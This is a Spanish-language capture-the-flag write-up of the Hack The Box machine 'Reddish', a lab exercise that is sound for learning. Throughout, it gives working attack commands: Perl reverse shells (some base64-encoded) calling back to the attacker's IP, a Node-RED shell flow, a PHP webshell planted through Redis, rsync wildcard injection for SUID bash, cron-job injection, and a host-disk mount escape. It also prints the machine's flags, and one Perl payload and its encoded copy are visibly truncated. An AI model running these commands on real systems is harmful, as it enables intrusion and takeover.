---
tags:
title: Reddish - Insane (HTB)
toc: true
permalink: /Reddish -HTB-Writeup
toc_sticky: true
toc_label: Topics
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p1880 10.129.237.161                                            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-04 00:20 -0300
Nmap scan report for 10.129.237.161
Host is up (0.42s latency).

PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.82 seconds
```

## Website 

En la pagina veo un error, el cual indica que no acepta solicitudes `GET`.

![image-center](/assets/images/Pasted image 20260104002125.png)

Es por eso que desde mi consola con `curl` envié una petición a la misma, devolviéndome así un `endpoint` de la propia pagina.

```bash
curl -s -X POST 'http://10.129.237.161:1880'
{"id":"f5170eb61abcf284f5cab4b9e46eb3a8","ip":"::ffff:10.10.17.19","path":"/red/{id}"}
```

Usando estos mismos datos, veo que ahora el error cambia, indicándome que solicitudes `POST` no las acepta.

```bash
curl -s -X POST 'http://10.129.237.161:1880/red/f5170eb61abcf284f5cab4b9e46eb3a8'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot POST /red/f5170eb61abcf284f5cab4b9e46eb3a8</pre>
</body>
</html>
```

## Node-Red

Veo que es un panel del servicio de `Node-red`, por lo que acudí a este [repositorio](https://github.com/valkyrix/Node-Red-Reverse-Shell) en el cual me deja un código en `JSON` el cual puedo usar para conseguir una `shell` en el sistema.

![image-center](/assets/images/Pasted image 20260104002433.png)
## Shell as root @container 172.18.0.2 172.19.0.4

Solo me queda seleccionar en Import > Clipboard, para poder importar este flujo.

![image-center](/assets/images/Pasted image 20260105114910.png)

Copio y pego el payload, lo que me despliega el siguiente flujo.

![image-center](/assets/images/Pasted image 20260105133131.png)

Así que le doy a `Deploy` y recibo la shell como `root` pero en un contenedor de `docker`.

```bash
 nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.237.161] 47736
whoami
root
[object Object]
```

Veo que tengo dos segmentos de red.

```bash
[object Object]hostname -I
172.18.0.2 172.19.0.4 
```
### Upgrade shell

Primero para tener una shell mas interactiva use el siguiente comando de `perl` ya que no esta python, ni php en la maquina instalados.

```bash
[object Object]perl -e 'use Socket;$i="10.10.17.19";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
```

Y abajo ya tengo la shell.

```bash
 nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.237.161] 43760
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@nodered:/node-red# whoami
whoami
root
```
### Ping sweep

Use un bucle `for` para sobre cada uno de estos segmentos descubrir que rangos de `ip` existen.

```bash
root@nodered:/node-red# for i in {1..254} ;do (ping -c 1 172.18.0.$i | grep "bytes from" &) ;done
64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.046 ms
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.020 ms
root@nodered:/node-red# for i in {1..254} ;do (ping -c 1 172.19.0.$i | grep "bytes from" &) ;done
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.055 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.064 ms
64 bytes from 172.19.0.3: icmp_seq=1 ttl=64 time=0.057 ms
64 bytes from 172.19.0.4: icmp_seq=1 ttl=64 time=0.016 ms
```

Ahora que tengo las `IPs` use este script en `bash` para poder detectar que puertos están abiertos para cada una.

```bash 
#!/bin/bash
ips=(172.18.0.1 172.18.0.2 172.19.0.1 172.19.0.2 172.19.0.3 172.19.0.4)
for ip in "${ips[@]}"; do
  echo "Escaneando $ip..."
  for i in $(seq 1 10000); do
      timeout 1 bash -c "echo '' > /dev/tcp/$ip/$i" 2>/dev/null && echo "\t[+] Puerto Abierto $i" &
  done; wait 
done
```
### Transfer file

Como la maquina no cuenta con `nano` o `vi`, no puedo crear el archivo dentro de la misma, por lo que para transferirlo, primero crearlo en la maquina victima, necesito codificarlo en `base64`.

```bash
cat port.sh | base64 -w0
cm9vdEBub2RlcmVkOi9ub2RlLXJlZCMgY2F0IHNoZWxsLnNoIAojIS9iaW4vYmFzaAppcHM9KDE3Mi4xOC4wLjEgMTcyLjE4LjAuMiAxNzIuMTkuMC4xIDE3Mi4xOS4wLjIgMTcyLjE5LjAuMyAxNzIuMTkuMC40KQpmb3IgaXAgaW4gIiR7aXBzW0BdfSI7IGRvCiAgZWNobyAiRXNjYW5lYW5kbyAkaXAuLi4iCiAgZm9yIGkgaW4gJChzZXEgMSAxMDAwMCk7IGRvCiAgICAgIHRpbWVvdXQgMSBiYXNoIC1jICJlY2hvICcnID4gL2Rldi90Y3AvJGlwLyRpIiAyPi9kZXYvbnVsbCAmJiBlY2hvICJcdFsrXSBQdWVydG8gQWJpZXJ0byAkaSIgJgogIGRvbmU7IHdhaXQgCmRvbmUK
```

Luego en la maquina victima lo coloco dentro de un archivo de la siguiente forma:

```bash
echo cm9vdEBub2RlcmVkOi9ub2RlLXJlZCMgY2F0IHNoZWxsLnNoIAojIS9iaW4vYmFzaAppcHM9KDE3Mi4xOC4wLjEgMTcyLjE4LjAuMiAxNzIuMTkuMC4xIDE3Mi4xOS4wLjIgMTcyLjE5LjAuMyAxNzIuMTkuMC40KQpmb3IgaXAgaW4gIiR7aXBzW0BdfSI7IGRvCiAgZWNobyAiRXNjYW5lYW5kbyAkaXAuLi4iCiAgZm9yIGkgaW4gJChzZXEgMSAxMDAwMCk7IGRvCiAgICAgIHRpbWVvdXQgMSBiYXNoIC1jICJlY2hvICcnID4gL2Rldi90Y3AvJGlwLyRpIiAyPi9kZXYvbnVsbCAmJiBlY2hvICJcdFsrXSBQdWVydG8gQWJpZXJ0byAkaSIgJgogIGRvbmU7IHdhaXQgCmRvbmUK | base64 -d > port_scan.sh; chmod +x port_scan.sh
```
## Shell as www-data @nodered

Y ya después de ejecutarlo veo que puertos corren para cada `ip`.

```bash
root@nodered:/node-red# ./port_scan.sh 
Escaneando 172.18.0.1...
\t[+] Puerto Abierto 1880
Escaneando 172.18.0.2...
\t[+] Puerto Abierto 1880
Escaneando 172.19.0.1...
Escaneando 172.19.0.2...
\t[+] Puerto Abierto 6379
Escaneando 172.19.0.3...
\t[+] Puerto Abierto 80
Escaneando 172.19.0.4...
\t[+] Puerto Abierto 1880
```

Para tener una idea de las redes que tenemos acceso me cree unos apuntes para saber a que pertenece cada una.

```bash
172.18.0.1 <-- Node-Red

172.18.0.2 <-- Node-Red

172.19.0.1

172.19.0.2 <-- Redis

172.19.0.3 <-- Website

172.19.0.4 <-- Node-Red
```
### Port Forwarding

Así que para tener acceso a estos puertos desde mi maquina necesito subir `chisel` y para poder subirlo a la maquina use el siguiente comando de `perl`.

```bash
perl -MHTTP::Tiny -e 'HTTP::Tiny->new->mirror("http://10.10.17.19/chisel", "chisel")'
```

Ahora desde mi maquina creo un servidor inverso:

```bash
./chisel server -p 5555 -reverse
```

Y desde la maquina victima use este comando para poder crear el tunel y acceder a los servicios.

```bash
./chisel client 10.10.17.19:5555 -R 6739:127.0.0.1:6739 -R 80:127.0.0.1:80
```

### Website / 172.19.0.3:80

Por el puerto `80` corre una pagina que muestra el siguiente mensaje.

![image-center](/assets/images/Pasted image 20260105134806.png)

Pero viendo el código fuente veo algunos `endpoints`.

![image-center](/assets/images/Pasted image 20260104033336.png)

Algunos muestras números en cuantos a los `hits` que quiero pensar que son las veces que se recarga la pagina.
### Redis / Port 6379

En cuanto al servicio de `redis` use la `redis-cli` para poder enumerar este servicio, y es así como vi una base de datos, el cual corresponde a la función de `hits`, por lo que ya se que estas dos `IPs` están relacionadas entre si.

```bash
redis-cli -h 127.0.0.1 -p 6379
127.0.0.1:6379> INFO keyspace
# Keyspace
db0:keys=1,expires=0,avg_ttl=0
(0.73s)
127.0.0.1:6379> SELECT 0
OK
(0.73s)
127.0.0.1:6379> keys *
1) "hits"
(0.79s)
127.0.0.1:6379> get hits
"1"
(0.87s)
```
### Webshell

Así que como el propio archivo que corre la web es `php` se me ocurrió insertar una webshell en esta pagina misma. Para eso con la ayuda de [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis#php-webshell), cree la webshell, asignándole una ruta `(/8924d0549008565c554f8128cd11fda4)` y un nombre, además debido a que el archivo se limpia cree un script que me automatiza la subida de mi archivo malicioso.

```bash
cat upload.sh              
#!/bin/bash
cat cmd.php| redis-cli -h 127.0.0.1 -x set rev
redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4
redis-cli -h 127.0.0.1 config set dbfilename cmd.php
redis-cli -h 127.0.0.1 save
```

Al correrlo veo respuestas `OK`.

```bash
./upload.sh             
OK
OK
OK
OK
```

Y al ir a la ruta veo que efectivamente puedo ejecutar comandos como el usuario `www-data`.

![image-center](/assets/images/Pasted image 20260104035024.png)

Además veo que hay un segmento adicional.

![image-center](/assets/images/Pasted image 20260104040745.png)

Para poder recibir una shell mas cómoda, subí [socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) el cual me va a permitir la comunicación a través de un host, que en este caso es `172.19.0.3`, para así poder enviarle un payload en `perl` a este host el cual va a redirigir el flujo a mi `ip`.
### Interactive shell

Lo descargo con el siguiente comando.

```bash
root@nodered:/node-red# perl -MHTTP::Tiny -e 'HTTP::Tiny->new->mirror("http://10.10.17.19:8080/socat", "socat")'
```

Y establezco el trafico que reciba `172.19.0.3` por el puerto `9001` lo envié a mi `ip`, además lo dejo en segundo plano para poder seguir haciendo `Port Forwarding` de los servicios.

```bash
root@nodered:/node-red# ./socat TCP4-LISTEN:9001,fork TCP4:10.10.17.19:1337 &
[1] 26134
```

Ahora que tengo el `socat` corriendo puedo enviar la shell a la maquina host con el siguiente comando.

```bash
view-source:http://localhost/8924d0549008565c554f8128cd11fda4/cmd.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22172.19.0.4%22%3B%24p%3D9001%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22bash%20-i%22)%3B%7D%3B%27
```

Y desde mi listener `nc` veo que exitosamente recibo la shell como `www-data`.

```bash
nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.237.161] 50332
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@www:/var/www/html/8924d0549008565c554f8128cd11fda4$
```
### Ping sweep fail

Veo que al querer ver las ips de este segmento me da un error, indica que tengo que convertirme en `root` para poder hacer `ping`.

```bash
for i in {1..254} ;do (ping -c 1 172.20.0.$i | grep "bytes from" &) ;done
<SNIP>
www-data@www:/home/somaro$ ping -c 1 localhost
ping: icmp open socket: Operation not permitted
```
## Shell as root @www

Dentro de la ruta `/backup` veo un archivo, el cual parece que corre como `root`, en el mismo veo que con `rsync` ejecuta todos los archivos que acaben con la extensión `.rdb`.

```bash
www-data@www:/backup$ cat backup.sh 
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
```
### Wildcard abuse

Para poder abusar de esto se que puedo crear un archivo, por ejemplo, `test.rdb` con el siguiente contenido.

```bash
#!/bin/bash
chmod u+s /bin/bash
```

Y siguiendo el ejemplo en [GTFObins](https://gtfobins.github.io/gtfobins/rsync/#shell) `rsync` tiene un parámetro  `-e` el cual me permite ejecuta un comando, por lo que cree un archivo `-e sh test.rdb`, haciendo que cuando se ejecute el script se haga algo como esto 

```bash
rsync -a -e sh test.rdb ...
```

Haciendo que de esta manera se ejecute con `sh` el archivo `test.rdb`.

Nuevamente para poder transferir el archivo use `base64`.

```bash
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$ echo IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo= | base64 -d > test.rdb
```
### SUID Shell

Luego cree el payload.

```
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$ touch -- '-e sh test.rdb'

```

Y viendo luego de unos minutos los permisos de la `bash` veo que es `SUID`.

```bash
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1029624 Nov  5  2016 /bin/bash
```

Ahora ya puedo convertirme en root y así ver el rango de `IPs` para ese segmento.

```bash
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$ bash -p 
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
bash-4.3# whoami
root
bash-4.3# for i in {1..254} ;do (ping -c 1 172.20.0.$i | grep "bytes from" &) ;done
64 bytes from 172.20.0.1: icmp_seq=1 ttl=64 time=0.055 ms
64 bytes from 172.20.0.2: icmp_seq=1 ttl=64 time=0.051 ms
64 bytes from 172.20.0.3: icmp_seq=1 ttl=64 time=0.015 ms
```

Y además ya puedo ver la user flag.

```bash
bash-4.3# cat user.txt 
4fa7f38ba6ad05935ebc53ef28fc57ba
```
### Port scanning

Use el mismo script en bash para ver los servicios y veo que para uno de estos el cual tiene sentido, corre el servicio de `rsync` .

```bash
bash-4.3# bash port.sh
Escaneando 172.20.0.1...
Escaneando 172.20.0.2...
\t[+] Puerto Abierto 873
        Escaneando 172.20.0.3...
\t[+] Puerto Abierto 80
bash-4.3# hostname -I
172.19.0.3 172.20.0.3
```
## Shell as root @backup
### rsync

Usando `rsync` puedo enumerar los directorios, usando los `endpoints` de el script, veo que en uno están los archivos que corren la web.

```bash
bash-4.3# rsync -av --list-only rsync://172.20.0.2/src/backup/
receiving incremental file list
drwxr-xr-x          4,096 2018/07/15 17:42:41 .
-rw-r--r--          2,023 2018/05/04 19:55:07 index.html
-rw-r--r--             17 2018/05/04 19:55:07 info.php
drwxr-xr-x          4,096 2018/07/15 17:42:41 8924d0549008565c554f8128cd11fda4
-rw-r--r--            280 2018/05/04 19:55:07 8924d0549008565c554f8128cd11fda4/ajax.php
-rw-r--r--             40 2018/05/04 19:55:07 8924d0549008565c554f8128cd11fda4/config.ini
drwxr-xr-x          4,096 2018/07/15 17:42:41 8924d0549008565c554f8128cd11fda4/lib
-rw-r--r--          1,317 2018/05/04 19:55:08 8924d0549008565c554f8128cd11fda4/lib/Autoloader.php
-rw-r--r--          4,307 2018/05/04 19:55:08 8924d0549008565c554f8128cd11fda4/lib/Client.php
-rw-r--r--          1,739 2018/05/04 19:55:08 8924d0549008565c554f8128cd11fda4/lib/Config.php
-rw-r--r--          1,252 2018/05/04 19:55:08 8924d0549008565c554f8128cd11fda4/lib/JsonResult.php
-rw-r--r--            484 2018/05/04 19:55:08 8924d0549008565c554f8128cd11fda4/lib/Pool.php
-rw-r--r--          2,935 2018/05/04 19:55:08 8924d0549008565c554f8128cd11fda4/lib/Result.php
-rw-r--r--          1,261 2018/05/04 19:55:08 8924d0549008565c554f8128cd11fda4/lib/Server.php
drwxr-xr-x          4,096 2018/07/15 17:42:41 assets
-rw-r--r--         78,601 2018/05/04 19:55:07 assets/jquery.js
drwxr-xr-x          4,096 2018/07/15 17:42:41 f187a0ec71ce99642e4f0afbd441a68b
```

Despues en `/src/` veo la raiz de otro contenedor.

```bash
bash-4.3# rsync rsync://172.20.0.2/src
drwxr-xr-x          4,096 2018/07/15 17:42:39 .
-rwxr-xr-x              0 2018/05/04 21:01:30 .dockerenv
-rwxr-xr-x            100 2018/05/04 19:55:07 docker-entrypoint.sh
drwxr-xr-x          4,096 2018/07/15 17:42:41 backup
drwxr-xr-x          4,096 2018/07/15 17:42:39 bin
drwxr-xr-x          4,096 2018/07/15 17:42:38 boot
drwxr-xr-x          4,096 2018/07/15 17:42:39 data
drwxr-xr-x          3,640 2026/01/04 03:20:29 dev
drwxr-xr-x          4,096 2018/07/15 17:42:39 etc
drwxr-xr-x          4,096 2018/07/15 17:42:38 home
drwxr-xr-x          4,096 2018/07/15 17:42:39 lib
drwxr-xr-x          4,096 2018/07/15 17:42:38 lib64
drwxr-xr-x          4,096 2018/07/15 17:42:38 media
drwxr-xr-x          4,096 2018/07/15 17:42:38 mnt
drwxr-xr-x          4,096 2018/07/15 17:42:38 opt
dr-xr-xr-x              0 2026/01/04 03:20:29 proc
drwxr-xr-x          4,096 2026/01/04 07:25:01 rdb
drwx------          4,096 2018/07/15 17:42:38 root
drwxr-xr-x          4,096 2026/01/04 03:20:31 run
drwxr-xr-x          4,096 2018/07/15 17:42:38 sbin
drwxr-xr-x          4,096 2018/07/15 17:42:38 srv
dr-xr-xr-x              0 2026/01/04 07:16:09 sys
drwxrwxrwt          4,096 2026/01/04 07:48:01 tmp
drwxr-xr-x          4,096 2018/07/15 17:42:39 usr
drwxr-xr-x          4,096 2018/07/15 17:42:39 var
```
### Cron task abuse

Para poder acceder a este contenedor puedo usar las mismas tareas `CRON`, ya que puedo leer y escribir archivos en el mismo.

```bash
bash-4.3# rsync rsync://172.20.0.2/src/etc/cron.d/
drwxr-xr-x          4,096 2018/07/15 17:42:39 .
-rw-r--r--            102 2015/06/11 10:23:47 .placeholder
-rw-r--r--             29 2018/05/04 20:57:55 clean
```

Primero cree la tarea cron en el contenedor actual, que como la misma indica, cada minuto el usuario `root` ejecuta con `sh` el archivo `reverse.sh` el cual va a ser un archivo con una reverse shell dentro.

```bash
bash-4.3# echo "* * * * * root sh /tmp/reverse" > reverse
```

Para moverlo a la ruta `/tmp` del contenedor use el siguiente comando.

```bash
bash-4.3# rsync reverse rsync://172.20.0.2/src/etc/cron.d/reverse
```

Y para verificar:

```bash
bash-4.3# rsync rsync://172.20.0.2/src/etc/cron.d/
drwxr-xr-x          4,096 2026/01/04 08:12:14 .
-rw-r--r--            102 2015/06/11 10:23:47 .placeholder
-rw-r--r--             29 2018/05/04 20:57:55 clean
-rw-r--r--            155 2026/01/04 08:12:14 reverse
```
### Reverse shell

Luego en el script `reverse.sh` coloco el siguiente payload.

```perl
perl -e 'use Socket;$i="172.20.0.3";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
```

Pero para colocarlo dentro del archivo use nuevamente `base64`.

```bash
echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjIwLjAuMyI7JHA9OTAwMTtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCJiYXNoIC1pIik7fTsnCg== | base64 -d > /tmp/reverse.sh
```

Y para moverlo uso el mismo comando que antes, pero esta vez colocandolo en `/tmp`.

```bash
bash-4.3# rsync /tmp/reversee.sh rsync://172.20.0.2/src/tmp/reversee.sh
bash-4.3# rsync rsync://172.20.0.2/src/tmp/
drwxrwxrwt          4,096 2026/01/05 03:07:19 .
-rw-r--r--            150 2026/01/04 08:18:54 reverse.sh
-rw-r--r--            155 2026/01/05 03:07:19 reversee.sh
```

Ahora con el mismo `socat` puedo crear un listener, pero para eso necesito descargarlo en la maquina.
Para esto puedo usar el redirector que cree con `socat` en el primer `host`, para poder usar el mismo para con `__curl` descargar el archivo. 

Para crear la funcion `__curl` en el sistema copie y pegue el siguiente comando:

```php
function __curl() {
   read -r proto server path <<<"$(printf '%s' "${1//// }")"
   if [ "$proto" != "http:" ]; then
     printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
     return 1
   fi
   DOC=/${path// //}
   HOST=${server//:*}
   PORT=${server//*:}
   [ "${HOST}" = "${PORT}" ] && PORT=80
    
   exec 3<>"/dev/tcp/${HOST}/$PORT"
   printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
   (while read -r line; do
    [ "$line" = $'\r' ] && break
   done && cat) <&3
   exec 3>&-
}
```

Luego puedo descargarlo, esto solicita el binario de `socat` a `172.19.0.4` pero como hay un redirector hacia mi `ip` lo descarga desde mi maquina por el puerto `1337` como lo configure anteriormente.

```bash
__curl http://172.19.0.4:9001/socat > socat
```

Veo que efectivamente lo descarga.

```bash
 python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.129.237.161 - - [04/Jan/2026 05:00:38] code 404, message File not found
10.129.237.161 - - [04/Jan/2026 05:00:38] "GET /socat HTTP/1.0" 200 -
```
### Set listener

Ahora con el mismo socat ya puedo crear el `listener`.

```bash
bash-4.3# ./socat TCP4-LISTEN:7777,fork TCP4:172.19.0.3:9001 &
[1] 28398
```

Y luego de un minuto recibo la shell como `root`.

Hago el tratamiento de la `tty`.

```bash
bash-4.3# ./socatt TCP-LISTEN:9001 stdout
bash: cannot set terminal process group (6018): Inappropriate ioctl for device
bash: no job control in this shell
root@backup:~# whoami^H^H^H^H^H^H
      
root@backup:~# script /dev/null -c bash
script /dev/null -c bash
root@backup:~# ^Z
[1]+  Stopped                 ./socatt TCP-LISTEN:9001 stdout
bash-4.3# stty raw -echo; fg
./socatt TCP-LISTEN:9001 stdout
                               reset xterm
```
### Mount

Vi que en la partición `/dev/sda2` se hizo una montura de la maquina real, pero de solo de la ruta `/backup`.

```bash
root@backup:~# df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay         5.3G  4.1G  1.2G  79% /
tmpfs            64M     0   64M   0% /dev
tmpfs           997M     0  997M   0% /sys/fs/cgroup
/dev/sda2       5.3G  4.1G  1.2G  79% /backup
shm              64M     0   64M   0% /dev/shm
root@backup:~# hostname 
backup
```

Para poder acceder a la raiz entera, primero en el directorio `/mnt` cree un directorio mas.

```bash
root@backup:~# mkdir -p /mnt/privesc
```

Y luego realice la montura.

```
root@backup:~# mount /dev/sda2 /mnt/privesc

```

Ya desde acá, puedo ver todos los directorios de la raíz.

```
root@backup:~# cd /mnt/privesc
root@backup:/mnt/privesc# ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
```
### root flag

Y accediendo a la ruta de `/root/` pude ver la ultima flag.

```bash
root@backup:/mnt/privesc/root# cat root.txt 
b3142d97136337bad6a57f8914eeb235
```

### Cron task again

Nuevamente para poder acceder a la maquina real, puedo crear nuevamente una tarea `cron` y luego la shell directamente a mi maquina.

```bash
echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTcuMTkiOyRwPTkwMDE7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiYmFzaCAtaSIpO307Jwo= | base64 -d > shell.sh
```

Y luego en el directorio `/cron.d`.

```bash
bashroot@backup:/mnt/privesc/etc/cron.d# echo '* * * * * root sh /opt/shell.sh' > shell 
```
### Shell 

Y luego de un minuto, en mi maquina, recibo la shell como `root`.

```bash
root@kali# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.237.161] 43378
/bin/sh: 0: can't access tty; job control turned off
# hostname
reddish
# whoami
root
```

`~Happy Hacking.`
